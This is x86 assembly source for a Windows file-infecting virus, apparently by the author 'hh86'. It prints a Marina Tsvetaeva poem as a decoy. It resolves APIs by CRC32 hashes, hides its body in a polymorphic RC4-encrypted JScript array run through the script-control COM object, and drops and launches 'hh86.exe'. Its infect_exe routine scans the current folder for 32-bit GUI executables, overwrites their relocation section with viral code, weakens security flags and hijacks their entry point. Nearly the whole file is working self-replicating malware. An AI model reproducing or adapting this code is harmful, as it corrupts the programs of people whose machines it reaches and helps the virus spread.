.386
.model  flat, stdcall
include unit00.inc
.data

;form follows function - do not alter order!

StorageBegin            db     86h
bufferRC4               db     bufferRC4Size          dup (0)
bufferANSI              db     "b=[", bufferANSISize  dup (0)
keyBuffer               db     keyLength              dup (0)
keySchedule             db     keyScheduleSize        dup (0)


.data?
mapStorage2 struct
    mapStorageBegin  BYTE sizeof StorageBegin dup (?)
    mapBufferRC4     BYTE sizeof bufferRC4    dup (?)
    mapBufferANSI    BYTE sizeof bufferANSI   dup (?)
    mapKeyBuffer     BYTE sizeof keyBuffer    dup (?)
    mapKeySchedule   BYTE sizeof keySchedule  dup (?)
mapStorage2 ends

.code
assume fs:nothing

link_text       proc     near
        call    text_end

text_begin      label    near
        db      49h, 20h, 63h, 68h
        db      72h, 69h, 73h, 74h
        db      65h, 6eh, 20h, 79h
        db      6fh, 75h, 72h, 20h
        db      66h, 72h, 69h, 67h
        db      68h, 74h, 65h, 6eh
        db      69h, 6eh, 67h, 20h
        db      66h, 6ch, 69h, 67h
        db      68h, 74h, 3ah, 0ah
        db      0dh, 59h, 6fh, 75h
        db      6eh, 67h, 20h, 65h
        db      61h, 67h, 6ch, 65h
        db      2ch, 20h, 72h, 69h
        db      73h, 65h, 20h, 69h
        db      6eh, 20h, 74h, 68h
        db      65h, 20h, 61h, 69h
        db      72h, 21h, 0ah, 0dh
        db      59h, 6fh, 75h, 20h
        db      73h, 74h, 61h, 72h
        db      65h, 64h, 20h, 61h
        db      74h, 20h, 74h, 68h
        db      65h, 20h, 73h, 75h
        db      6eh, 21h, 20h, 2dh
        db      20h, 6dh, 79h, 20h
        db      6ch, 69h, 67h, 68h
        db      74h, 0ah, 0dh, 41h
        db      6eh, 64h, 20h, 64h
        db      65h, 6ch, 69h, 63h
        db      61h, 74h, 65h, 20h
        db      67h, 61h, 7ah, 65h
        db      20h, 63h, 61h, 6eh
        db      27h, 74h, 20h, 63h
        db      6fh, 6dh, 70h, 61h
        db      72h, 65h, 2eh, 0ah
        db      0dh, 0ah, 0dh, 49h
        db      20h, 73h, 74h, 6fh
        db      6fh, 64h, 2ch, 20h
        db      6dh, 6fh, 72h, 65h
        db      20h, 74h, 65h, 6eh
        db      64h, 65h, 72h, 20h
        db      74h, 68h, 61h, 6eh
        db      20h, 74h, 68h, 6fh
        db      73h, 65h, 0ah, 0dh
        db      57h, 68h, 6fh, 27h
        db      76h, 65h, 20h, 77h
        db      69h, 74h, 6eh, 65h
        db      73h, 73h, 65h, 64h
        db      20h, 79h, 6fh, 75h
        db      20h, 64h, 69h, 73h
        db      61h, 70h, 70h, 65h
        db      61h, 72h, 2eh, 2eh
        db      2eh, 0ah, 0dh, 49h
        db      27h, 6dh, 20h, 6bh
        db      69h, 73h, 73h, 69h
        db      6eh, 67h, 20h, 79h
        db      6fh, 75h, 20h, 6eh
        db      6fh, 77h, 20h, 2dh
        db      20h, 61h, 63h, 72h
        db      6fh, 73h, 73h, 0ah
        db      0dh, 54h, 68h, 65h
        db      20h, 67h, 61h, 70h
        db      20h, 6fh, 66h, 20h
        db      61h, 20h, 74h, 68h
        db      6fh, 75h, 73h, 61h
        db      6eh, 64h, 20h, 79h
        db      65h, 61h, 72h, 73h
        db      2eh, 0ah, 0dh
        db      "Marina Tsvetaeva (1916)"

text_end        label    near
        pop     ecx
        xor     ebx, ebx
        push    ebx
        push    500h
        push    ebx
        push    ebx
        push    offset text_end - offset text_begin
        push    ecx
        push    -0bh                         ;STD_OUTPUT_HANDLE
        call    WriteFile
        call    Sleep
        call    ExitProcess
link_text       endp

ui2adec         proc     near
        push    ecx
        push    eax
        call    skip_intcode
        db      "%i",0

skip_intcode    label    near
        push    edi
        call    wsprintf
        add     esp, 0ch
        pop     ecx
        add     edi, eax
        ret
ui2adec         endp

fill_array      proc
        xor     eax, eax
        lods    byte ptr [esi]
        call    ui2adec
        mov     al, ","
        stos    byte ptr [edi]
        loop    fill_array
        mov     byte ptr [edi - 1], "]"
        ret
fill_array      endp

unit00_exe      label    near

;-------------------------------------------------------------------------------
;initialise 128-bit random key
;-------------------------------------------------------------------------------

        push    ebx                          ;save PEB address for later use
        mov     edi, offset StorageBegin + mapStorage2.mapKeyBuffer
        mov     esi, edi
        push    keyLength / sizeof mapStackRegisters.regEax
        pop     ebx

init_rc4key     label    near
        call    GetTickCount
        stos    dword ptr [edi]
        dec     ebx
        jnz     init_rc4key
        mov     eax, ebx

init_rc4ks      label    near

;-------------------------------------------------------------------------------
;initialise RC4 key schedule
;operate only on 8-bit registers so to not use "AND reg32, 0ffh" fence
;-------------------------------------------------------------------------------

        mov     byte ptr [edi + eax], al
        inc     al
        jnz     init_rc4ks
        mov     edx, eax

permutate_ksa   label    near
        push    eax
        mov     bl, keyLength
        div     bl                           ;AND would optimise it, but does not work
        mov     bl, ah
        pop     eax
        add     dl, byte ptr [esi + ebx]
        add     dl, byte ptr [edi + eax]
        mov     bl, byte ptr [edi + eax]
        xchg    byte ptr [edi + edx], bl
        mov     byte ptr [edi + eax], bl
        inc     al
        jnz     permutate_ksa

;-------------------------------------------------------------------------------
;initialise RC4 pseudo-random generation algorithm
;operate only on 8-bit registers so to not use "AND reg32, 0ffh" fence
;-------------------------------------------------------------------------------

        mov     esi, offset unit00_begin
        mov     ebp, offset StorageBegin + mapStorage2.mapBufferRC4
        mov     dx, offset unit00_end - offset unit00_begin
        push    edx
        push    ebp
        mov     ebx, eax

init_rc4rga     label    near
        push    edx
        inc     al
        cdq
        add     bl, byte ptr [edi + eax]
        mov     dl, byte ptr [edi + eax]
        xchg    byte ptr [edi + ebx], dl
        mov     byte ptr [edi + eax], dl
        mov     dl, byte ptr [edi + eax]
        add     dl, byte ptr [edi + ebx]
        mov     cl, byte ptr [edi + edx]
        xor     cl, byte ptr [esi]
        mov     byte ptr [ebp], cl
        inc     ebp
        inc     esi
        pop     edx
        dec     edx
        jnz     init_rc4rga

;-------------------------------------------------------------------------------
;encryption is over now
;initialise JScript body and key variables
;-------------------------------------------------------------------------------

        pop     esi
        pop     ecx
        mov     edi, offset StorageBegin + mapStorage2.mapBufferANSI + (sizeof mapStorage2.mapStorageBegin * 3)
        call    fill_array                   ;transform encrypted body into array items
        mov     eax, "[=k;"                  ;array for key data
        stos    dword ptr [edi]
        mov     esi, offset StorageBegin + mapStorage2.mapKeyBuffer
        mov     cl, keyLength
        call    fill_array                   ;transform encryption key into array items
        call    init_jscode

jsbodyref1      label    near

;-------------------------------------------------------------------------------
;inline JScript encryption/decryption function
;-------------------------------------------------------------------------------

        db      ";h();"
        db      "function h(){"
        db          "c=[];"
        db          "d=r(b,k);"
        db          "for(i=0;i<d.length;i++){"
        db              "c[i]=d[i].toString(16);"
        db              'if(c[i].length==1){c[i]="0"+c[i]}'
        db          "};"
        db          "n=[];"
        db          "for(i=0;i<15;i++)n[i]=Math.floor(Math.random()*256);"
        db          "e=r(d,n);"
        db          'return c.join("")+"b=["+e.join(",")+"];k=["+n.join(",")+"];h();"+h+"";'
        db          "function r(b,k){"
        db              "s=[];"
        db              "o=[];"
        db              "for(i=0;i<256;i++){s[i]=i}"
        db              "j=0;"
        db              "for(i=0;i<256;i++){"
        db                  "t=s[i];"
        db                  "s[i]=s[j=(j+t+k[i%k.length])%256];"                   ;use k.length or use number (keyLength)
        db                  "s[j]=t"
        db              "}"
        db              "i=0;"
        db              "j=0;"
        db              "for(u=0;u<b.length;u++){"
        db                  "i++;"
        db                  "i%=256;"
        db                  "t=s[i];"
        db                  "s[i]=s[j=(j+t)%256];"
        db                  "s[j]=t;"
        db                  "o[u]=(b[u]^s[(s[i]+s[j])%256])"
        db              "}"
        db              "return o"
        db          "}"
        db      "}"

jsbodyref2      label    near

init_jscode     label    near

;-------------------------------------------------------------------------------
;initialise BSTR encoding (with no length)
;-------------------------------------------------------------------------------

        pop     esi
        mov     cx, offset jsbodyref2 - offset jsbodyref1
        rep     movs byte ptr [edi], byte ptr [esi]
        mov     esi, offset StorageBegin + mapStorage2.mapBufferANSI
        push    esi
        call    lstrlen
        inc     eax
        inc     eax
        cdq
        push    bodySize
        push    offset decryptor
        push    eax
        push    esi
        push    edx
        push    edx
        call    MultiByteToWideChar
        pop     ebx
        mov     esi, offset code_begin
        mov     byte ptr [esi + (offset bodyref2 - offset code_begin) - 1], (offset object_file - offset objecthdr) shr 1
        mov     byte ptr [esi + (offset ole32off - offset code_begin) - 1], offset ole32_crc - offset ole32_name
        push    offset link_text
        jmp     unit00_pushoff

code_begin      label    near

;-------------------------------------------------------------------------------
;here begins code in infected files
;-------------------------------------------------------------------------------

        push    dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.dwImageBaseAddress]
        add     dword ptr [esp], "hh86"      ;replaced by entrypoint

unit00_pushoff  label    near
        pushad
        call    unit00_seh
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        ret

unit00_seh      label    near
        xor     edx, edx
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        mov     eax, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.lpLoaderData]
        mov     esi, dword ptr [eax + _PEB_LDR_DATA.dwInLoadOrderModuleList.FLink]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     ebp, dword ptr [eax + 18h]
        call    walk_dll
        dd      0b09315f4h                   ;CloseHandle
        dd      0553b5c78h                   ;CreateFileA
        dd      0b41b926ch                   ;CreateFileMappingA
        dd      0d82bf69ah                   ;FindClose
        dd      0c9ebd5ceh                   ;FindFirstFileA
        dd      075272948h                   ;FindNextFileA
        dd      07fbc7431h                   ;GlobalAlloc
        dd      0636b1e9dh                   ;GlobalFree
        dd      03fc1bd8dh                   ;LoadLibraryA
        dd      0a89b382fh                   ;MapViewOfFile
        dd      0156b9702h                   ;SetFileAttributesA
        dd      0391ab6afh                   ;UnmapViewOfFile
        dd      048fea11eh                   ;WinExec
        dd      0cce95612h                   ;WriteFile
        db      0

bodyref0        label    near

;-------------------------------------------------------------------------------
;choose code path
;-------------------------------------------------------------------------------

        mov     ebp, esp
        inc     ecx

bodyref1        label    near
        js      init_ole32

;-------------------------------------------------------------------------------
;initialise file object
;-------------------------------------------------------------------------------

        mov     ebx, ecx
        mov     ch, 40h
        push    ecx
        push    ecx
        push    GMEM_ZEROINIT
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kGlobalAlloc - 4]
        lea     edx, dword ptr [esi - (offset bodyref0 - offset code_begin)]
        lea     esi, dword ptr [esi + (offset objecthdr - offset bodyref0)]
        push    eax
        push    "h"

bodyref2        label    near
        pop     ecx
        xchg    edi, eax

expand_hdr      label    near
        lods    word ptr [esi]
        mov     bl, ah
        mov     byte ptr [edi + ebx], al
        loop    expand_hdr
        mov     ch, 2
        add     edi, ecx
        xchg    edx, esi
        mov     cx, offset unit00_begin - offset code_begin
        push    edi
        rep     movs byte ptr [edi], byte ptr [esi]
        pop     edi
        mov     byte ptr [edi + (offset bodyref1 - offset code_begin) - 1], 49h
        pop     eax
        pop     ebx
        push    eax                          ;GlobalFree
        push    ecx                          ;WinExec
        push    edx                          ;WinExec
        push    ecx                          ;WriteFile
        push    esp                          ;WriteFile
        push    ebx                          ;WriteFile
        push    eax                          ;WriteFile
        push    ecx                          ;CreateFileA
        push    ecx                          ;CreateFileA
        push    CREATE_ALWAYS                ;CreateFileA
        push    ecx                          ;CreateFileA
        push    ecx                          ;CreateFileA
        push    3                            ;CreateFileA
        push    edx                          ;CreateFileA
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kCreateFileA - 4]
        push    eax
        xchg    esi, eax
        call    dword ptr [ebp]
        push    esi
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kCloseHandle - 4]
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kWinExec - 4]
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kGlobalFree - 4]
        int     3

objecthdr       label    near
        db      "M",                                IMAGE_DOS_HEADER.e_magic
        db      "Z",                                IMAGE_DOS_HEADER.e_magic + 1
        db      "P",                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.Signature
        db      "E",                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.Signature + 1
        db      low IMAGE_FILE_MACHINE_I386,        IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.Machine
        db      high IMAGE_FILE_MACHINE_I386,       IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.Machine + 1
        db      1,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.NumberOfSections
        db      60h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader
        db      2,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.Characteristics
        db      low IMAGE_NT_OPTIONAL_HDR32_MAGIC,  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.Magic
        db      high IMAGE_NT_OPTIONAL_HDR32_MAGIC, IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.Magic + 1
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint + 1
        db      0ch,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.BaseOfData
        db      40h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.ImageBase + 2
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment + 1
        db      2,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.FileAlignment + 1
        db      4,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.MajorSubsystemVersion
        db      40h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage + 1
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders + 1
        db      IMAGE_SUBSYSTEM_WINDOWS_GUI,        IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.Subsystem
        db      30h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.Misc.VirtualSize + 79h
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.VirtualAddress + 79h
        db      0fh,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.SizeOfRawData + 79h
        db      2,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.PointerToRawData + 79h
        db      0a0h,                               IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.Characteristics + 7bh

object_file     label    near

;-------------------------------------------------------------------------------
;object file name
;-------------------------------------------------------------------------------

        db      "hh86.exe", 0

init_ole32      label    near

;-------------------------------------------------------------------------------
;initialize COM support
;-------------------------------------------------------------------------------

        call    skip_ole32

ole32_name      label    near
        db      "ole32", 0

GUIDMS          label    near
        db      0d5h, 0f1h, 059h, 00eh, 0beh, 01fh, 0d0h, 011h, 08fh, 0f2h, 000h, 0a0h, 0d1h, 000h, 038h, 0bch

GUIDIS          label    near
        db      0d3h, 0f1h, 059h, 00eh, 0beh, 01fh, 0d0h, 011h, 08fh, 0f2h, 000h, 0a0h, 0d1h, 000h, 038h, 0bch

ScriptLanguage  label    near
        dw      "J", "S", "c", "r", "i", "p", "t"

RFIID           label    near
        db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 0c0h, 000h, 000h, 000h, 000h, 000h, 000h, 046h

ole32_crc       label    near
        dd      0c522bceh
        dd      8bde44b5h
        dd      581db250h
        db      0

init_interf     label    near
        xor     ebx, ebx
        push    ebx
        push    ebx
        push    ebx
        push    ebx
        push    1                            ;0x88000001
        push    esp
        push    "h"
        push    ebx                          ;IScriptControl interface pointer
        push    ebx                          ;pointer to IUnknown interface
        mov     edi, esp
        push    edi
        lea     ecx, dword ptr [esi - (offset init_interf - offset RFIID)]
        lea     ebp, dword ptr [esi - (offset init_interf - offset GUIDMS)]
        push    ecx
        push    1                            ;CLSCTX_INPROC_SERVER or use 0x17
        push    ebx
        push    ebp
        push    ebx
        call    dword ptr [edi + mapStackAPIOLE32.oleCoInitialize + sizeof mapStorage]
        call    dword ptr [edi + mapStackAPIOLE32.oleCoCreateInstance + sizeof mapStorage]
        lea     eax, dword ptr [ebp + (offset GUIDIS - offset GUIDMS)]
        lea     edx, dword ptr [eax + (offset decryptor - offset GUIDIS)]
        push    edx
        lea     edx, dword ptr [ebp + (offset ScriptLanguage - offset GUIDMS)]
        push    edx
        mov     esi, dword ptr [edi]
        mov     ebp, dword ptr [esi]
        push    esi
        lea     ecx, dword ptr [edi + mapStorage.IScriptControl]
        push    ecx
        push    eax
        push    esi
        call    dword ptr [ebp + IUNKNOWN.QueryInterface]
        call    dword ptr [ebp + IUNKNOWN.Release]
        mov     esi, dword ptr [edi + mapStorage.IScriptControl]
        push    esi
        mov     ecx, dword ptr [esi]
        call    dword ptr [ecx + IScriptControlPutLanguage]
        push    esi
        mov     ecx, dword ptr [esi]
        call    dword ptr [ecx + IScriptControlAddCode]
        lea     ebp, dword ptr [edi + mapStorage.fakeVARIANTARG]
        push    ebp
        lea     eax, dword ptr [edi + mapStorage.SafeArrayPointer]
        push    eax
        sub     eax, 4
        push    eax
        push    esi
        lods    dword ptr [eax]
        call    dword ptr [eax + IScriptControlRun]
        pushad
        call    skip_decseh

delta_innseh    label    near
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        popad
        mov     esi, dword ptr [edi + mapStorage.pIUnknown]
        push    esi
        lods    dword ptr [esi]
        call    dword ptr [eax + 8]
        call    dword ptr [edi + mapStackAPIOLE32.oleCoUninitialize + sizeof mapStorage]
        int     3

skip_decseh     label    near
        pop     edi
        push    edi
        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        add     edi, offset decryptor - offset delta_innseh
        mov     esi, dword ptr [ebp + VARIANTARG.pData]
        mov     ecx, offset unit00_end - offset unit00_begin
        push    edi

process_bstr    label    near

;-------------------------------------------------------------------------------
;decode BSTR data string and execute decrypted code
;-------------------------------------------------------------------------------

        lods    word ptr [esi]
        call    biunicode
        xchg    edx, eax
        lods    word ptr [esi]
        call    biunicode
        shl     dl, 4
        add     al, dl
        stos    byte ptr [edi]
        loop    process_bstr

biunicode       label    near
        add     al, 40h
        cbw
        and     ah, 9
        add     al, ah
        and     al, 0fh
        ret                                  ;no jump to replication body

skip_ole32      label    near

;-------------------------------------------------------------------------------
;get OLE32 API
;-------------------------------------------------------------------------------

        pop     esi
        push    esi
        call    dword ptr [ebp + mapStackAPIK32.kLoadLibraryA]
        xchg    ebp, eax
        add     esi, "h"

ole32off        label    near
        push    esi

;-------------------------------------------------------------------------------
;DLL walker
;-------------------------------------------------------------------------------

walk_dll        label    near
        pop     esi
        mov     ebx, ebp
        mov     eax, dword ptr [ebp + IMAGE_DOS_HEADER_E_LFANEW]
        add     ebx, dword ptr [ebp + eax + IMAGE_DOS_HEADER_E_LFANEW shl 1]
        cdq

walk_names      label    near
        mov     eax, ebp
        mov     edi, ebp
        inc     edx
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY_ADDRESS_OF_NAMES]
        add     edi, dword ptr [eax + edx * 4]
        or      eax, -1

crc32_l1        label    near
        xor     al, byte ptr [edi]
        push    8
        pop     ecx

crc32_l2        label    near
        shr     eax, 1
        jnc     crc32_l3
        xor     eax, 0edb88320h

crc32_l3        label    near
        loop    crc32_l2
        inc     edi
        cmp     byte ptr [edi], cl
        jne     crc32_l1
        not     eax
        cmp     dword ptr [esi], eax
        jne     walk_names
        mov     edi, ebp
        mov     eax, ebp
        add     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY_ADDRESS_OF_NAME_ORDINALS]
        movzx   edi, word ptr [edi + edx * 2]
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY_ADDRESS_OF_FUNCTIONS]
        mov     eax, dword ptr [eax + edi * 4]
        add     eax, ebp
        push    eax
        lods    dword ptr [esi]
        sub     cl, byte ptr [esi]
        jnz     walk_names
        inc     esi
        jmp     esi

decryptor       label    near

;-------------------------------------------------------------------------------
;here begins JScript code buffer
;-------------------------------------------------------------------------------

        db      bodySize dup (0)

unit00_begin    label    near

;-------------------------------------------------------------------------------
;here begins unit00, this code is carried in a JScript array
;-------------------------------------------------------------------------------

        enter   sizeof WIN32_FIND_DATA + 2, 0
        push    "*"
        mov     esi, esp
        push    esi
        push    esi
        call    dword ptr [ebp + sizeof mapStorage + mapStackAPIK32.kFindFirstFileA + sizeof mapStackAPIOLE32 + sizeof mapSEH + 4]
                                             ;+ sizeof STACKREGS.RegEbp because ebp is pushed by enter
        xchg    edi, eax

map_file        label    near
        push    dword ptr [esi + WIN32_FIND_DATA.dwFileAttributes]
        lea     ecx, dword ptr [esi + low WIN32_FIND_DATA.cFileName]
        push    ecx
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    3                            ;GENERIC_READ | GENERIC_WRITE
        push    ecx
        push    FILE_ATTRIBUTE_ARCHIVE
        push    ecx
        call    dword ptr [ebp + sizeof mapStorage + mapStackAPIK32.kSetFileAttributesA + sizeof mapStackAPIOLE32 + sizeof mapSEH + 4]
        call    dword ptr [ebp + sizeof mapStorage + mapStackAPIK32.kCreateFileA + sizeof mapStackAPIOLE32 + sizeof mapSEH + 4]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    PAGE_READWRITE
        push    ebx
        push    eax
        call    dword ptr [ebp + sizeof mapStorage + mapStackAPIK32.kCreateFileMappingA + sizeof mapStackAPIOLE32 + sizeof mapSEH + 4]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    FILE_MAP_WRITE
        push    eax
        call    dword ptr [ebp + sizeof mapStorage + mapStackAPIK32.kMapViewOfFile + sizeof mapStackAPIOLE32 + sizeof mapSEH + 4]
        push    eax
        pushad
        call    infect_exe

delta_mapseh    label    near
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        call    dword ptr [ebp + sizeof mapStorage + mapStackAPIK32.kUnmapViewOfFile + sizeof mapStackAPIOLE32 + sizeof mapSEH + 4]
        call    dword ptr [ebp + sizeof mapStorage + mapStackAPIK32.kCloseHandle + sizeof mapStackAPIOLE32 + sizeof mapSEH + 4]
        call    dword ptr [ebp + sizeof mapStorage + mapStackAPIK32.kCloseHandle + sizeof mapStackAPIOLE32 + sizeof mapSEH + 4]
        call    dword ptr [ebp + sizeof mapStorage + mapStackAPIK32.kSetFileAttributesA + sizeof mapStackAPIOLE32 + sizeof mapSEH + 4]
        push    esi
        push    edi
        call    dword ptr [ebp + sizeof mapStorage + mapStackAPIK32.kFindNextFileA + sizeof mapStackAPIOLE32 + sizeof mapSEH + 4]
        test    eax, eax
        jnz     map_file
        push    edi
        call    dword ptr [ebp + sizeof mapStorage + mapStackAPIK32.kFindClose + sizeof mapStackAPIOLE32 + sizeof mapSEH + 4]

breakpoint      label    near

;-------------------------------------------------------------------------------
;common exit point
;-------------------------------------------------------------------------------

        int     3

infect_exe      label    near

;-------------------------------------------------------------------------------
;parse file struct
;signatures must match those of PE exe files
;-------------------------------------------------------------------------------

        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        cmp     word ptr [eax], "ZM"
        jne     breakpoint
        mov     edi, eax
        add     eax, dword ptr [eax + IMAGE_DOS_HEADER_E_LFANEW]
        cmp     dword ptr [eax], "EP"
        jne     breakpoint

;-------------------------------------------------------------------------------
;32-bit machine
;discard DLL files (because they do not have own PEB) and system files
;do not test IMAGE_FILE_32BIT_MACHINE because it is ignored by Windows even for PE32+
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS_FILEHEADER_MACHINE], IMAGE_FILE_MACHINE_I386
        jne     breakpoint
        movzx   ecx, word ptr [eax + IMAGE_NT_HEADERS_FILEHEADER_CHARACTERISTICS]
        test    cl, IMAGE_FILE_EXECUTABLE_IMAGE
        jz      breakpoint
        test    ch, high (IMAGE_FILE_DLL or IMAGE_FILE_SYSTEM)
        jnz     breakpoint

;-------------------------------------------------------------------------------
;before check size of optional header make sure optional header is PE32
;IMAGE_NT_OPTIONAL_HDR_MAGIC must match PE32 structure (not ROM, not 64-bit) configuration
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS_OPTIONALHEADER_MAGIC], IMAGE_NT_OPTIONAL_HDR32_MAGIC
        jne     breakpoint

;-------------------------------------------------------------------------------
;standard SizeOfOptionalHeader
;-------------------------------------------------------------------------------

        movzx   edx, word ptr [eax + IMAGE_NT_HEADERS_FILEHEADER_SIZEOF_OPTIONAL_HEADER]
        cmp     dx, 0e0h
        jne     breakpoint

;-------------------------------------------------------------------------------
;no config table, because it might contain SafeSEH
;-------------------------------------------------------------------------------

        cmp     dword ptr [eax + IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG_TABLE], ebx
        jne     breakpoint

;-------------------------------------------------------------------------------
;Windows GUI subsystem file only
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS_OPTIONALHEADER_SUBSYSTEM], IMAGE_SUBSYSTEM_WINDOWS_GUI
        jne     breakpoint

;-------------------------------------------------------------------------------
;reloc place
;must start at beginning of section, and must be large enough to hold our codes
;-------------------------------------------------------------------------------

        imul    cx, word ptr [eax + IMAGE_NT_HEADERS_FILEHEADER_NUMBER_OF_SECTIONS], IMAGE_SECTION_HEADER_SIZEOF
        lea     esi, dword ptr [eax + edx + (IMAGE_NT_HEADERS_OPTIONALHEADER_MAGIC - IMAGE_SECTION_HEADER_SIZEOF) + IMAGE_SECTION_HEADER_VIRTUAL_ADDRESS]
        add     esi, ecx
        mov     edx, dword ptr [esi]
        mov     bl, IMAGE_DIRECTORY_ENTRY_RELOC_TABLE
        add     ebx, eax
        cmp     dword ptr [ebx], edx
        jne     breakpoint

;-------------------------------------------------------------------------------
;machine code is no variable size
;script code is variable size
;-------------------------------------------------------------------------------

        cmp     dword ptr [ebx + 4], bodySize
        jb      breakpoint

;-------------------------------------------------------------------------------
;unset *_NX_COMPAT below, then might not need IMAGE_SCN_MEM_EXECUTE in section flags
;-------------------------------------------------------------------------------

        or      byte ptr [esi + (IMAGE_SECTION_HEADER_CHARACTERISTICS - IMAGE_SECTION_HEADER_VIRTUAL_ADDRESS) + 3], (IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE) shr 18h

;-------------------------------------------------------------------------------
;copy machine code
;we use push rva to reduce script code size
;or do not use push rva and might require less machine code
;-------------------------------------------------------------------------------

        add     edi, dword ptr [esi + (IMAGE_SECTION_HEADER_POINTER_TO_RAW_DATA - IMAGE_SECTION_HEADER_VIRTUAL_ADDRESS)]
        mov     esi, dword ptr [ebp + mapSEH.pExceptionHandler + sizeof mapStackRegisters.regEbp]
        sub     esi, offset delta_innseh - offset code_begin
        push    edi
        mov     cx, offset decryptor - offset code_begin
        rep     movs byte ptr [edi], byte ptr [esi]

;-------------------------------------------------------------------------------
;copy script code
;-------------------------------------------------------------------------------

                                             ;skip (BSTR) encoded unit00
        mov     esi, (offset unit00_end - offset unit00_begin) * 4
        add     esi, dword ptr [ebp + sizeof mapSEH + 4 + mapStorage.fakeVARIANTARG + VARIANTARG.pData]

copy_jscript    label    near
        cmp     word ptr [esi], cx           ;check but copy null-terminator too
        movs    word ptr [edi], word ptr [esi]
        jne     copy_jscript

;-------------------------------------------------------------------------------
;alter entrypoint
;unset *_NO_SEH and *_FORCE_INTEGRITY flags in DllCharacteristics field
;clean up reloc data directory entries
;-------------------------------------------------------------------------------

        and     word ptr [eax + IMAGE_NT_HEADERS_OPTIONALHEADER_DLLCHARACTERISTICS], not (IMAGE_DLLCHARACTERISTICS_NO_SEH or IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY)
        mov     dword ptr [ebx], ecx
        mov     dword ptr [ebx + 4], ecx
        xchg    dword ptr [eax + IMAGE_NT_HEADERS_OPTIONALHEADER_ADDRESS_OF_ENTRYPOINT], edx
        pop     edi
        mov     dword ptr [edi + (offset unit00_pushoff - offset code_begin) - 4], edx
        mov     byte ptr [edi + (offset bodyref1 - offset code_begin) - 1], 41h
        int     3

unit00_end      label    near

end     unit00_exe